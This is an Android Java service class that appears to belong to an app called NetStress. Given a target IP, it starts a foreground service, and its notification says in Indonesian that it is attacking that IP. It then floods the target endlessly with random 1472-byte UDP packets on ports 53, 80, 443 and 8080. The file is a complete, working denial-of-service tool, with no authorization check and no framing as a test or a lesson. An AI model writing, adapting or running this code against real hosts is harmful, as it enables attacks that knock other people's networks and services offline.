package com.netstress.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Random;

public class StressService extends Service {
    private static final String CHANNEL_ID = "stress_channel";
    private Thread attackThread;
    private volatile boolean isAttacking = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String targetIp = intent.getStringExtra("TARGET_IP");
        if (targetIp == null) return START_NOT_STICKY;

        createNotificationChannel();
        
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("NetStress Aktif")
                .setContentText("Menyerang " + targetIp)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        startForeground(1, notification);

        isAttacking = true;
        attackThread = new Thread(() -> {
            try {
                InetAddress address = InetAddress.getByName(targetIp);
                DatagramSocket socket = new DatagramSocket();
                Random random = new Random();
                byte[] payload = new byte[1472];
                random.nextBytes(payload);
                
                int[] ports = {53, 80, 443, 8080};

                while (isAttacking) {
                    for (int i = 0; i < 5000; i++) {
                        int port = ports[random.nextInt(ports.length)];
                        DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
                        socket.send(packet);
                    }
                }
                socket.close();
            } catch (Exception e) {
                Log.e("NetStress", "Error: " + e.getMessage());
            }
        });
        attackThread.start();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        isAttacking = false;
        if (attackThread != null) {
            attackThread.interrupt();
        }
        super.onDestroy();
    }

    private void createNotificationChannel() {
        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID, "Stress Service Channel",
                NotificationManager.IMPORTANCE_LOW
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
